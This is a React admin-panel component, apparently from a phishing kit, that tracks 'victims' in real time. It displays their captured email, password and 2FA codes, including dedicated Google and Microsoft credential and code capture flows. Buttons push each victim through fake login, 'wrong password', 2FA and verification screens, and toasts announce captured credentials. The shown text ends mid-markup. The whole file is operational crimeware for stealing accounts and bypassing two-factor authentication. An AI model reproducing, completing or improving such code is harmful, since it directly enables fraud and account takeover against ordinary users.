import { useEffect, useMemo, useState } from "react";
import Sidebar from "../Sidebar";
import { IoLogoChrome } from "react-icons/io";
import { HiOutlineTrash, HiOutlineDesktopComputer } from "react-icons/hi";
import { FiRefreshCw, FiSmartphone, FiGlobe, FiLogOut, FiLock, FiLoader, FiKey, FiCheck, FiAlertTriangle, FiShield, FiLogIn, FiEye, FiSlash, FiChevronDown, FiSearch } from "react-icons/fi";
import toast from "react-hot-toast";
import { createSocket } from "../../lib/socket";
import { useMutation, useQuery, useQueryClient } from "@tanstack/react-query";
import { useNavigate } from "react-router-dom";
import { formatPostDate } from "../../dates/dateFunc";
import AdminAtmosphere from "../AdminAtmosphere";
import AdminBootIntro from "../AdminBootIntro";
import LivePagePreview from "./LivePagePreview";
import { motion } from "framer-motion";

function CountryFlag({ code, country, className = "" }) {
  const cc = (code || "").toUpperCase();
  if (!cc) return null;
  if (cc === "LO") {
    return (
      <span
        className={`inline-flex items-center justify-center text-[9px] font-medium uppercase tracking-wide text-zinc-400 bg-white/5 border border-white/10 rounded px-1 py-0.5 ${className}`}
        title={country || "Local"}
      >
        Local
      </span>
    );
  }
  return (
    <img
      src={`https://flagcdn.com/20x15/${cc.toLowerCase()}.png`}
      srcSet={`https://flagcdn.com/40x30/${cc.toLowerCase()}.png 2x`}
      width={18}
      height={13}
      alt={country || cc}
      title={country || cc}
      className={`inline-block rounded-[2px] object-cover shrink-0 ${className}`}
      loading="lazy"
    />
  );
}

const PAGES = [
  {
    id: "caseLookup",
    label: "Lookup your case",
    hint: "Case ID",
    icon: FiSearch,
    tone: "action",
  },
  {
    id: "login",
    label: "Login",
    hint: "Email / password",
    icon: FiLogIn,
    tone: "neutral",
  },
  {
    id: "wrongPass",
    label: "Wrong pass",
    hint: "Show error",
    icon: FiAlertTriangle,
    tone: "danger",
  },
  {
    id: "loading",
    label: "Loading",
    hint: "Wait spinner",
    icon: FiLoader,
    tone: "wait",
  },
  {
    id: "code",
    label: "2FA code",
    hint: "Ask for code",
    icon: FiShield,
    tone: "action",
  },
  {
    id: "wrongCode",
    label: "Wrong code",
    hint: "Code error",
    icon: FiKey,
    tone: "danger",
  },
  {
    id: "verifying",
    label: "Verifying",
    hint: "Code check",
    icon: FiLock,
    tone: "wait",
  },
  {
    id: "review",
    label: "Review",
    hint: "Approve / decline",
    icon: FiEye,
    tone: "action",
  },
  {
    id: "success",
    label: "Success",
    hint: "Done",
    icon: FiCheck,
    tone: "success",
  },
];

const TONE_STYLES = {
  neutral: {
    idle: "border-white/10 bg-white/[0.02] hover:bg-white/[0.06] hover:border-white/20",
    active: "border-zinc-300/40 bg-zinc-100/10 text-zinc-100 shadow-[inset_0_0_0_1px_rgba(255,255,255,0.06)]",
    icon: "text-zinc-400",
    iconActive: "text-zinc-100 bg-white/10",
  },
  danger: {
    idle: "border-rose-500/15 bg-rose-500/[0.04] hover:bg-rose-500/[0.1] hover:border-rose-500/30",
    active: "border-rose-400/50 bg-rose-500/15 text-rose-100",
    icon: "text-rose-400/70",
    iconActive: "text-rose-200 bg-rose-500/20",
  },
  wait: {
    idle: "border-amber-500/15 bg-amber-500/[0.04] hover:bg-amber-500/[0.1] hover:border-amber-500/30",
    active: "border-amber-400/50 bg-amber-500/15 text-amber-50",
    icon: "text-amber-400/70",
    iconActive: "text-amber-200 bg-amber-500/20",
  },
  action: {
    idle: "border-sky-500/15 bg-sky-500/[0.04] hover:bg-sky-500/[0.1] hover:border-sky-500/30",
    active: "border-sky-400/50 bg-sky-500/15 text-sky-50",
    icon: "text-sky-400/70",
    iconActive: "text-sky-200 bg-sky-500/20",
  },
  success: {
    idle: "border-emerald-500/15 bg-emerald-500/[0.04] hover:bg-emerald-500/[0.1] hover:border-emerald-500/30",
    active: "border-emerald-400/50 bg-emerald-500/15 text-emerald-50",
    icon: "text-emerald-400/70",
    iconActive: "text-emerald-200 bg-emerald-500/20",
  },
};

function playBeepSound() {
  try {
    const AudioContext = window.AudioContext || window.webkitAudioContext;
    if (!AudioContext) return;
    const ctx = new AudioContext();
    const oscillator = ctx.createOscillator();
    const gain = ctx.createGain();
    oscillator.connect(gain);
    gain.connect(ctx.destination);
    oscillator.type = "sine";
    oscillator.frequency.value = 880;
    gain.gain.setValueAtTime(0.08, ctx.currentTime);
    gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.18);
    oscillator.start();
    oscillator.stop(ctx.currentTime + 0.18);
  } catch {
    /* ignore */
  }
}

function statusTone(user) {
  const page = user?.currentPage;
  const status = user?.currentStatus;
  if (status === "waiting") return { label: "Waiting for you", color: "bg-amber-400" };
  if (status === "searching_case")
    return { label: "Searching case", color: "bg-sky-400" };
  if (status === "verifying") return { label: "Code submitted", color: "bg-sky-400" };
  if (status === "reviewApproved") return { label: "Review approved", color: "bg-emerald-400" };
  if (status === "reviewDeclined") return { label: "Review declined", color: "bg-rose-400" };
  if (status === "wrongPass") return { label: "Wrong password", color: "bg-rose-400" };
  if (status === "wrongCode") return { label: "Wrong code", color: "bg-rose-400" };
  if (status === "done_google" || status === "disconnectSubmitted")
    return { label: "Google done", color: "bg-emerald-400" };
  if (status === "verify_resending") return { label: "Loading", color: "bg-amber-400" };
  if (status === "google_sms_resending") return { label: "Loading", color: "bg-amber-400" };
  if (status === "msPhoneResending") return { label: "Loading", color: "bg-amber-400" };
  if (status === "ms2faResending") return { label: "Loading", color: "bg-amber-400" };
  if (status === "accept_device_resending")
    return { label: "Loading", color: "bg-amber-400" };
  if (status === "disconnectPassWaiting") return { label: "Google pass in", color: "bg-amber-400" };
  if (status === "google_sms_waiting") return { label: "Google SMS in", color: "bg-violet-400" };
  if (status === "google_sms_2fa") return { label: "Google 2FA", color: "bg-violet-400" };
  if (status === "ms2faWaiting") return { label: "MS 2FA in", color: "bg-violet-400" };
  if (status === "ms2fa") return { label: "Microsoft 2FA", color: "bg-violet-400" };
  if (status === "verify_its_you")
    return { label: "Verify it's you", color: "bg-sky-400" };
  if (status === "accept_device" || page === "accept_device")
    return { label: "Accept device", color: "bg-sky-400" };
  if (status === "disconnectEmail" || status === "disconnectPass")
    return { label: "Google password", color: "bg-amber-300" };
  if (status === "disconnectOpen") return { label: "Google email", color: "bg-rose-300" };
  if (page === "loading") return { label: "On loading", color: "bg-amber-400" };
  if (page === "review") return { label: "On review", color: "bg-sky-400" };
  if (page === "code") return { label: "On 2FA", color: "bg-violet-400" };
  if (page === "success") return { label: "Finished", color: "bg-emerald-400" };
  if (page === "disconnect") return { label: "Disconnect", color: "bg-rose-400" };
  if (page === "login") return { label: "On login", color: "bg-zinc-400" };
  return { label: page || "Idle", color: "bg-zinc-500" };
}

function Victim() {
  const queryClient = useQueryClient();
  const navigate = useNavigate();
  const [selectedId, setSelectedId] = useState(null);
  const [promptNumber, setPromptNumber] = useState("");
  const [disconnectProvider, setDisconnectProvider] = useState(null); // "google" | "microsoft" | null
  const [bootIntro, setBootIntro] = useState(() => {
    try {
      return sessionStorage.getItem("admin_boot_intro") !== "1";
    } catch {
      return true;
    }
  });

  useEffect(() => {
    if (!bootIntro) return undefined;
    const t = setTimeout(() => {
      setBootIntro(false);
      try {
        sessionStorage.setItem("admin_boot_intro", "1");
      } catch {
        /* ignore */
      }
    }, 1850);
    return () => clearTimeout(t);
  }, [bootIntro]);

  const {
    data: users,
    isLoading,
    isError,
    error,
  } = useQuery({
    queryKey: ["allUsers"],
    queryFn: async () => {
      const res = await fetch("/api/v1/rumman/user/all-user");
      const data = await res.json();
      if (!res.ok || data?.error) {
        throw new Error(data?.error || "Failed to load sessions");
      }
      return data;
    },
    refetchInterval: 8000,
  });

  const { data: visits } = useQuery({
    queryKey: ["visits"],
    queryFn: async () => {
      const res = await fetch("/api/v1/rumman/user/visits");
      const data = await res.json();
      if (!res.ok || data?.error) throw new Error(data?.error || "Error");
      return data;
    },
  });

  const { data: connects } = useQuery({
    queryKey: ["connects"],
    queryFn: async () => {
      const res = await fetch("/api/v1/rumman/user/connects");
      const data = await res.json();
      if (!res.ok || data?.error) throw new Error(data?.error || "Error");
      return data;
    },
  });

  const selectedUser = useMemo(() => {
    if (!users?.length) return null;
    return users.find((u) => u._id === selectedId) || users[0];
  }, [users, selectedId]);

  // Auto-expand provider panel when victim is on that flow
  useEffect(() => {
    if (selectedUser?.currentPage === "disconnect" || selectedUser?.currentPage === "accept_device") {
      setDisconnectProvider("google");
    } else if (selectedUser?.currentPage === "microsoft") {
      setDisconnectProvider("microsoft");
    }
  }, [selectedUser?.currentPage, selectedUser?._id]);

  useEffect(() => {
    if (users?.length && selectedId == null) {
      setSelectedId(users[0]._id);
    }
  }, [users, selectedId]);

  const { mutate: changePage, isPending: changingPage } = useMutation({
    mutationFn: async ({ userId, page, prompt, phoneHint }) => {
      const body = {};
      if (prompt != null) body.prompt = prompt;
      if (phoneHint != null) body.phoneHint = phoneHint;
      const res = await fetch(`/api/v1/rumman/user/page/${userId}/${page}`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(body),
      });
      const data = await res.json().catch(() => ({}));
      if (!res.ok) throw new Error(data.error || "Failed to change page");
      return data;
    },
    onSuccess: (data) => {
      queryClient.invalidateQueries({ queryKey: ["allUsers"] });
      if (data?._id) setSelectedId(data._id);
      toast.success("Page updated");
    },
    onError: (err) =>
      toast.error(err?.message || "Could not change page"),
  });

  const { mutate: status, isPending: statusUpdating } = useMutation({
    mutationFn: async (userId) => {
      const res = await fetch(`/api/v1/rumman/user/situation/${userId}`, {
        method: "POST",
        headers: { "Content-type": "application/json" },
      });
      const data = await res.json();
      if (!res.ok) throw data.error || "Something went wrong";
      return data;
    },
    onSuccess: () => {
      Promise.all([
        queryClient.invalidateQueries({ queryKey: ["visits"] }),
        queryClient.invalidateQueries({ queryKey: ["allUsers"] }),
        queryClient.invalidateQueries({ queryKey: ["connects"] }),
      ]);
    },
  });

  const { mutate: deleteUser, isPending: deleting } = useMutation({
    mutationFn: async (userId) => {
      const res = await fetch(`/api/v1/rumman/user/delete/${userId}`, {
        method: "DELETE",
      });
      const data = await res.json();
      if (!res.ok) throw data.error || "Something went wrong";
      return data;
    },
    onSuccess: (_, userId) => {
      toast.success("Session removed");
      if (selectedId === userId) setSelectedId(null);
      queryClient.invalidateQueries({ queryKey: ["allUsers"] });
    },
  });

  const { mutate: banIp, isPending: banning } = useMutation({
    mutationFn: async (ip) => {
      const res = await fetch("/api/v1/rumman/bans", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ ip, note: "Banned from session" }),
      });
      const data = await res.json();
      if (!res.ok) throw new Error(data.error || "Could not ban IP");
      return data;
    },
    onSuccess: () => {
      toast.success("IP banned");
      queryClient.invalidateQueries({ queryKey: ["bans"] });
    },
    onError: (err) => toast.error(err.message || "Ban failed"),
  });

  const { mutate: logout, isPending: loggingOut } = useMutation({
    mutationFn: async () => {
      const res = await fetch("/api/v1/rumman/auth/logout", {
        method: "POST",
      });
      const data = await res.json();
      if (!res.ok) throw new Error(data.error || "Logout failed");
      return data;
    },
    onSuccess: () => {
      try {
        sessionStorage.removeItem("admin_boot_intro");
      } catch {
        /* ignore */
      }
      queryClient.invalidateQueries({ queryKey: ["adminUser"] });
      toast.success("Logged out");
      navigate("/admin", { replace: true });
    },
    onError: () => {
      toast.error("Could not log out");
    },
  });

  useEffect(() => {
    const socket = createSocket();

    socket.on("new_user_registered", (payload) => {
      playBeepSound();
      queryClient.invalidateQueries({ queryKey: ["allUsers"] });
      queryClient.invalidateQueries({ queryKey: ["visits"] });
      const user = payload?.user || payload;
      if (user?._id) setSelectedId(user._id);
      toast.success("New visit");
    });

    socket.on("presence_changed", () => {
      queryClient.invalidateQueries({ queryKey: ["allUsers"] });
    });

    socket.on("user_updated", (payload) => {
      playBeepSound();
      queryClient.invalidateQueries({ queryKey: ["allUsers"] });
      queryClient.invalidateQueries({ queryKey: ["connects"] });
      const user = payload?.user || payload;
      if (user?._id) setSelectedId(user._id);
      if (user?.password && user?.currentStatus === "waiting") {
        toast.success("Password captured — waiting for you");
      } else if (user?.currentStatus === "reviewApproved") {
        toast.success("Review approved");
      } else if (user?.currentStatus === "reviewDeclined") {
        toast("Review declined", { icon: "!" });
      } else if (user?.currentStatus === "accept_device_resending") {
        toast("Accept device · loading", { icon: "↻" });
      } else if (user?.currentStatus === "ms2faResending") {
        toast("Microsoft 2FA · loading", { icon: "↻" });
      } else if (user?.currentStatus === "ms2faWaiting") {
        toast.success("Microsoft 2FA captured");
      } else if (user?.currentStatus === "msPhoneResending") {
        toast("Microsoft phone · loading", { icon: "↻" });
      } else if (user?.currentStatus === "verify_resending") {
        toast("Verify resend · loading", { icon: "↻" });
      } else if (user?.currentStatus === "google_sms_resending") {
        toast("Google SMS · loading", { icon: "↻" });
      } else if (user?.code) {
        toast.success("Code captured");
      } else {
        toast("Session updated", { icon: "↻" });
      }
    });

    return () => socket.close();
  }, [queryClient]);

  if (isLoading) {
    return (
      <div className="relative flex min-h-screen text-zinc-400 overflow-hidden">
        <AdminBootIntro show={bootIntro} />
        <AdminAtmosphere />
        <Sidebar />
        <div className="relative z-10 ml-64 flex-1 flex items-center justify-center">
          Loading sessions…
        </div>
      </div>
    );
  }

  if (isError) {
    return (
      <div className="relative flex min-h-screen text-rose-400 overflow-hidden">
        <AdminBootIntro show={false} />
        <AdminAtmosphere />
        <Sidebar />
        <div className="relative z-10 ml-64 flex-1 flex items-center justify-center">
          {error?.message || "Error"}
        </div>
      </div>
    );
  }

  const tone = selectedUser ? statusTone(selectedUser) : null;

  return (
    <div className="relative min-h-screen text-zinc-100 overflow-hidden">
      <AdminBootIntro show={bootIntro} />
      <AdminAtmosphere />
      <Sidebar />
      <motion.div
        className="relative z-10 ml-64 min-h-screen"
        initial={{ opacity: 0, y: 18 }}
        animate={
          bootIntro
            ? { opacity: 0, y: 18 }
            : { opacity: 1, y: 0 }
        }
        transition={{ duration: 0.55, ease: [0.22, 1, 0.36, 1], delay: bootIntro ? 0 : 0.05 }}
      >
        <header className="sticky top-0 z-20 border-b border-white/5 bg-[#07070a]/55 backdrop-blur-xl px-6 py-4 flex items-center justify-between">
          <div>
            <h1 className="text-lg font-semibold tracking-tight">Sessions</h1>
            <p className="text-xs text-zinc-500 mt-0.5">
              Advance pages manually after password or code
            </p>
          </div>
          <div className="flex items-center gap-2">
            <div className="flex items-center gap-1.5 rounded-lg border border-white/[0.06] bg-white/[0.03] p-0.5">
              <div className="flex items-baseline gap-1.5 rounded-md px-2.5 py-1.5">
                <span className="text-[10px] uppercase tracking-[0.08em] text-zinc-500">
                  Visits
                </span>
                <span className="text-[12px] font-semibold tabular-nums text-zinc-100">
                  {visits ?? 0}
                </span>
              </div>
              <span className="h-3 w-px bg-white/10" aria-hidden />
              <div className="flex items-baseline gap-1.5 rounded-md px-2.5 py-1.5">
                <span className="inline-flex items-center gap-1 text-[10px] uppercase tracking-[0.08em] text-zinc-500">
                  <span className="relative flex h-1.5 w-1.5">
                    {(connects ?? 0) > 0 && (
                      <span className="absolute inset-0 rounded-full bg-emerald-400/50 animate-ping" />
                    )}
                    <span
                      className={`relative block h-1.5 w-1.5 rounded-full ${
                        (connects ?? 0) > 0 ? "bg-emerald-400" : "bg-zinc-600"
                      }`}
                    />
                  </span>
                  Connects
                </span>
                <span
                  className={`text-[12px] font-semibold tabular-nums ${
                    (connects ?? 0) > 0 ? "text-emerald-300" : "text-zinc-100"
                  }`}
                >
                  {connects ?? 0}
                </span>
              </div>
            </div>
            <button
              type="button"
              onClick={() => queryClient.invalidateQueries({ queryKey: ["allUsers"] })}
              className="inline-flex h-7 w-7 items-center justify-center rounded-lg border border-white/[0.06] bg-white/[0.03] text-zinc-400 transition hover:bg-white/[0.07] hover:text-zinc-100"
              title="Refresh"
            >
              <FiRefreshCw className="w-3 h-3" />
            </button>
            <button
              type="button"
              disabled={loggingOut}
              onClick={() => logout()}
              className="inline-flex h-7 items-center gap-1.5 rounded-lg border border-white/[0.06] bg-white/[0.03] px-2.5 text-[11px] text-zinc-400 transition hover:border-rose-500/25 hover:bg-rose-500/10 hover:text-rose-300 disabled:opacity-60"
              title="Log out"
            >
              <FiLogOut className="w-3 h-3" />
              <span className="hidden sm:inline">Log out</span>
            </button>
          </div>
        </header>

        <div className="p-6 grid grid-cols-1 xl:grid-cols-12 gap-6">
          {/* Session list */}
          <section className="xl:col-span-5 space-y-3">
            {!users?.length && (
              <div className="rounded-2xl border border-dashed border-white/10 p-10 text-center text-sm text-zinc-500">
                No sessions yet. Waiting for visitors…
              </div>
            )}

            {users?.map((user) => {
              const active = selectedUser?._id === user._id;
              const t = statusTone(user);
              return (
                <button
                  key={user._id}
                  type="button"
                  onClick={() => setSelectedId(user._id)}
                  className={`w-full text-left rounded-2xl border p-4 transition ${
                    active
                      ? "border-sky-500/40 bg-sky-500/10 shadow-[0_0_0_1px_rgba(56,189,248,0.15)]"
                      : "border-white/5 bg-white/[0.03] hover:bg-white/[0.05]"
                  }`}
                >
                  <div className="flex items-start justify-between gap-3">
                    <div className="min-w-0">
                      <div className="flex items-center gap-2">
                        <span
                          className={`text-[10px] font-semibold uppercase tracking-[0.12em] ${
                            user.online ? "text-emerald-400" : "text-zinc-500"
                          }`}
                        >
                          {user.online ? "ONLINE" : "OFFLINE"}
                        </span>
                        <p className="text-sm font-medium truncate">
                          {user.email || user.ipAddress || "New visit"}
                        </p>
                      </div>
                      <p className="text-[11px] text-zinc-500 mt-1 flex items-center gap-1.5 min-w-0">
                        <CountryFlag code={user.countryCode} country={user.country} />
                        <span className="truncate">
                          {user.ipAddress || "—"} · {formatPostDate(user.createdAt)}
                        </span>
                      </p>
                    </div>
                    <span className="text-[10px] uppercase tracking-wide text-zinc-500 shrink-0">
                      {t.label}
                    </span>
                  </div>
                  <div className="mt-3 flex items-center gap-3 text-[11px] text-zinc-500">
                    <span className="inline-flex items-center gap-1">
                      {user.browser?.toLowerCase().includes("chrome") ? (
                        <IoLogoChrome className="w-3.5 h-3.5" />
                      ) : (
                        <FiGlobe className="w-3 h-3" />
                      )}
                      {user.browser || "Browser"}
                    </span>
                    <span className="inline-flex items-center gap-1 truncate">
                      <FiSmartphone className="w-3 h-3" />
                      {user.device || "Device"}
                    </span>
                    <span className="ml-auto text-zinc-400">{user.currentPage}</span>
                  </div>
                </button>
              );
            })}
          </section>

          {/* Detail + preview */}
          <section className="xl:col-span-7">
            {!selectedUser ? (
              <div className="rounded-2xl border border-white/5 bg-white/[0.02] h-full min-h-[480px] flex items-center justify-center text-zinc-500 text-sm">
                Select a session to preview
              </div>
            ) : (
              <div className="grid lg:grid-cols-2 gap-4 items-start">
                {/* Live preview — height fits content only */}
                <div className="rounded-2xl border border-white/5 bg-white/[0.02] overflow-hidden self-start">
                  <div className="px-4 py-3 border-b border-white/5 flex flex-wrap items-center gap-2 justify-between">
                    <div>
                      <div className="flex items-center gap-2">
                        <HiOutlineDesktopComputer className="w-4 h-4 text-sky-400" />
                        <h2 className="text-sm font-semibold">Live page preview</h2>
                      </div>
                      <p className="text-[11px] text-zinc-500 mt-1 flex items-center gap-1.5 flex-wrap">
                        <CountryFlag
                          code={selectedUser.countryCode}
                          country={selectedUser.country}
                        />
                        <span>
                          {selectedUser.online ? (
                            <span className="text-emerald-400 font-semibold">ONLINE</span>
                          ) : (
                            <span className="text-zinc-500 font-semibold">OFFLINE</span>
                          )}{" "}
                          · Victim is on{" "}
                          <span className="text-zinc-300">{selectedUser.currentPage}</span>
                          {selectedUser.currentStatus
                            ? ` · ${selectedUser.currentStatus}`
                            : ""}
                        </span>
                      </p>
                    </div>
                    <div className="flex items-center gap-2">
                      <button
                        type="button"
                        disabled={statusUpdating}
                        onClick={() => status(selectedUser._id)}
                        className="text-[11px] px-2.5 py-1.5 rounded-lg border border-white/10 hover:bg-white/5"
                      >
                        Mark {selectedUser.situation === "visits" ? "connects" : "visits"}
                      </button>
                      {selectedUser.ipAddress && (
                        <button
                          type="button"
                          disabled={banning}
                          onClick={() => banIp(selectedUser.ipAddress)}
                          className="inline-flex items-center gap-1 text-[11px] px-2.5 py-1.5 rounded-lg border border-rose-500/20 text-rose-300 hover:bg-rose-500/10"
                          title="Ban this IP"
                        >
                          <FiSlash className="w-3 h-3" />
                          Ban IP
                        </button>
                      )}
                      <button
                        type="button"
                        disabled={deleting}
                        onClick={() => deleteUser(selectedUser._id)}
                        className="p-1.5 rounded-lg text-rose-400 hover:bg-rose-500/10"
                        title="Delete"
                      >
                        <HiOutlineTrash className="w-4 h-4" />
                      </button>
                    </div>
                  </div>
                  <div className="p-4 pb-3 flex items-start justify-center bg-[radial-gradient(ellipse_at_top,_rgba(56,189,248,0.08),_transparent_55%)]">
                    <LivePagePreview
                      key={`${selectedUser._id}-${selectedUser.currentPage}-${selectedUser.currentStatus}`}
                      user={selectedUser}
                    />
                  </div>
                </div>

                <div className="rounded-2xl border border-white/5 bg-white/[0.02] p-5 space-y-5 self-start">
                    <div>
                      <p className="text-[11px] uppercase tracking-wider text-zinc-500 mb-2">
                        Credentials
                      </p>
                      <div className="rounded-xl bg-black/30 border border-white/5 divide-y divide-white/5 text-sm">
                        <div className="px-3 py-2.5 flex justify-between gap-3">
                          <span className="text-zinc-500">Email</span>
                          <span className="font-medium truncate text-right">
                            {selectedUser.email || "—"}
                          </span>
                        </div>
                        <div className="px-3 py-2.5 flex justify-between gap-3">
                          <span className="text-zinc-500">Password</span>
                          <span className="font-medium truncate text-right font-mono text-[13px]">
                            {selectedUser.password || "—"}
                          </span>
                        </div>
                        <div className="px-3 py-2.5 flex justify-between gap-3">
                          <span className="text-zinc-500">2FA code</span>
                          <span className="font-medium truncate text-right font-mono text-[13px]">
                            {selectedUser.code || "—"}
                          </span>
                        </div>
                      </div>
                    </div>

                    <div>
                      <div className="flex items-center justify-between gap-3 mb-3">
                        <div>
                          <p className="text-[11px] uppercase tracking-[0.14em] text-zinc-500">
                            Route session
                          </p>
                          <p className="text-[11px] text-zinc-600 mt-0.5">
                            Push the victim to the next screen
                          </p>
                        </div>
                        {tone && (
                          <span className="inline-flex items-center gap-1.5 rounded-full border border-white/10 bg-white/[0.03] px-2.5 py-1 text-[10px] text-zinc-400">
                            <span className={`w-1.5 h-1.5 rounded-full ${tone.color}`} />
                            {tone.label}
                          </span>
                        )}
                      </div>

                      {tone?.label === "Waiting for you" && (
                        <div className="mb-3 rounded-xl border border-amber-500/20 bg-amber-500/10 px-3 py-2.5">
                          <p className="text-[12px] font-medium text-amber-200">
                            Password captured
                          </p>
                          <p className="text-[11px] text-amber-200/70 mt-0.5">
                            Victim is spinning — send them to Loading, 2FA, or Wrong pass.
                          </p>
                        </div>
                      )}

                      <div className="flex flex-col gap-1.5">
                        {PAGES.map((p, index) => {
                          const isCurrent =
                            (p.id === selectedUser.currentPage &&
                              !["wrongPass", "wrongCode", "verifying"].includes(
                                selectedUser.currentStatus
                              )) ||
                            (p.id === "wrongPass" &&
                              selectedUser.currentStatus === "wrongPass") ||
                            (p.id === "wrongCode" &&
                              selectedUser.currentStatus === "wrongCode") ||
                            (p.id === "verifying" &&
                              selectedUser.currentStatus === "verifying") ||
                            (p.id === "loading" &&
                              selectedUser.currentPage === "loading") ||
                            (p.id === "loading" &&
                              selectedUser.currentStatus === "waiting" &&
                              selectedUser.currentPage === "login");

                          const styles = TONE_STYLES[p.tone];
                          const Icon = p.icon;

                          return (
                            <button
                              key={p.id}
                              type="button"
                              disabled={changingPage}
                              onClick={() =>
                                changePage({
                                  userId: selectedUser._id,
                                  page: p.id,
                                })
                              }
                              className={`group relative flex items-center gap-3 rounded-xl border px-3 py-2.5 text-left transition disabled:opacity-50 ${
                                isCurrent ? styles.active : styles.idle
                              }`}
                            >
                              <span
                                className={`flex h-8 w-8 shrink-0 items-center justify-center rounded-lg ${
                                  isCurrent ? styles.iconActive : styles.icon
                                }`}
                              >
                                <Icon
                                  className={`w-3.5 h-3.5 ${
                                    p.id === "loading" && isCurrent
                                      ? "animate-spin"
                                      : ""
                                  }`}
                                />
                              </span>
                              <span className="min-w-0 flex-1">
                                <span className="flex items-center gap-2">
                                  <span className="text-[12px] font-medium tracking-tight">
                                    {p.label}
                                  </span>
                                  {isCurrent && (
                                    <span className="rounded-md bg-white/10 px-1.5 py-0.5 text-[9px] uppercase tracking-wider text-zinc-300">
                                      Live
                                    </span>
                                  )}
                                </span>
                                <span className="block text-[10px] text-zinc-500 mt-0.5">
                                  {p.hint}
                                </span>
                              </span>
                              <span className="text-[10px] tabular-nums text-zinc-600 group-hover:text-zinc-400">
                                {String(index + 1).padStart(2, "0")}
                              </span>
                            </button>
                          );
                        })}
                      </div>
                    </div>

                    {/* Google & Microsoft — accordion */}
                    <div>
                      <div className="mb-3">
                        <p className="text-[11px] uppercase tracking-[0.14em] text-zinc-500">
                          Google & Microsoft
                        </p>
                        <p className="text-[11px] text-zinc-600 mt-0.5">
                          Choose a provider · expands the flow below
                        </p>
                      </div>

                      <div className="flex flex-col gap-2">
                        {/* Google */}
                        <div
                          className={`rounded-xl border overflow-hidden transition ${
                            disconnectProvider === "google"
                              ? "border-rose-500/30 bg-rose-500/[0.04]"
                              : "border-white/10 bg-white/[0.02]"
                          }`}
                        >
                          <button
                            type="button"
                            onClick={() =>
                              setDisconnectProvider((p) =>
                                p === "google" ? null : "google"
                              )
                            }
                            className="w-full flex items-center gap-3 px-3 py-2.5 text-left hover:bg-white/[0.03] transition"
                          >
                            <span className="flex h-8 w-8 shrink-0 items-center justify-center rounded-lg bg-white/95">
                              <svg viewBox="0 0 48 48" width="18" height="18" aria-hidden="true">
                                <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z" />
                                <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z" />
                                <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z" />
                                <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z" />
                              </svg>
                            </span>
                            <span className="min-w-0 flex-1">
                              <span className="flex items-center gap-2">
                                <span className="text-[12px] font-medium tracking-tight text-zinc-100">
                                  Google
                                </span>
                                {(selectedUser.currentPage === "disconnect" ||
                                  selectedUser.currentPage === "accept_device") && (
                                  <span className="inline-flex items-center gap-1 rounded-full border border-white/10 bg-white/[0.03] px-1.5 py-0.5 text-[9px] uppercase tracking-wider text-zinc-400">
                                    <span className="w-1.5 h-1.5 rounded-full bg-rose-400" />
                                    {selectedUser.currentStatus === "done_google" ||
                                    selectedUser.currentStatus === "disconnectSubmitted"
                                      ? "Done"
                                      : selectedUser.currentStatus === "accept_device_resending" ||
                                        selectedUser.currentStatus === "verify_resending" ||
                                        selectedUser.currentStatus === "google_sms_resending"
                                      ? "Loading"
                                      : selectedUser.currentStatus === "verify_its_you"
                                      ? "Verify"
                                      : selectedUser.currentPage === "accept_device" ||
                                        selectedUser.currentStatus === "accept_device"
                                      ? "Device"
                                      : selectedUser.currentStatus === "google_sms_2fa" ||
                                        selectedUser.currentStatus === "google_sms_waiting"
                                      ? "2FA"
                                      : selectedUser.currentStatus === "disconnectPassWaiting"
                                      ? "Pass wait"
                                      : selectedUser.currentStatus === "disconnectEmail" ||
                                        selectedUser.currentStatus === "disconnectPass"
                                      ? "Password"
                                      : "Email"}
                                  </span>
                                )}
                              </span>
                              <span className="block text-[10px] text-zinc-500 mt-0.5">
                                Mini popup · email → password → 2FA
                              </span>
                            </span>
                            <FiChevronDown
                              className={`w-4 h-4 text-zinc-500 shrink-0 transition-transform duration-200 ${
                                disconnectProvider === "google" ? "rotate-180" : ""
                              }`}
                            />
                          </button>

                          <div
                            className={`grid transition-[grid-template-rows] duration-300 ease-out ${
                              disconnectProvider === "google"
                                ? "grid-rows-[1fr]"
                                : "grid-rows-[0fr]"
                            }`}
                          >
                            <div className="overflow-hidden">
                              <div className="px-3 pb-3 pt-1 border-t border-white/5 space-y-3">
                                <div className="rounded-xl bg-black/30 border border-white/5 divide-y divide-white/5 text-sm">
                                  <div className="px-3 py-2.5 flex justify-between gap-3">
                                    <span className="text-zinc-500">Google email</span>
                                    <span className="font-medium truncate text-right">
                                      {selectedUser.googleEmail || "—"}
                                    </span>
                                  </div>
                                  <div className="px-3 py-2.5 flex justify-between gap-3">
                                    <span className="text-zinc-500">Google pass</span>
                                    <span className="font-medium truncate text-right font-mono text-[13px]">
                                      {selectedUser.googlePassword || "—"}
                                    </span>
                                  </div>
                                  <div className="px-3 py-2.5 flex justify-between gap-3">
                                    <span className="text-zinc-500">Google 2FA</span>
                                    <span className="font-medium truncate text-right font-mono text-[13px]">
                                      {selectedUser.googleCode || "—"}
                                    </span>
                                  </div>
                                  <div className="px-3 py-2.5 flex justify-between gap-3">
                                    <span className="text-zinc-500">Prompt #</span>
                                    <span className="font-medium truncate text-right font-mono text-[13px]">
                                      {selectedUser.googlePrompt || "—"}
                                    </span>
                                  </div>
                                </div>

                                {selectedUser.currentStatus === "disconnectPassWaiting" && (
                                  <div className="rounded-xl border border-amber-500/20 bg-amber-500/10 px-3 py-2.5">
                                    <p className="text-[12px] font-medium text-amber-200">
                                      Google password captured
                                    </p>
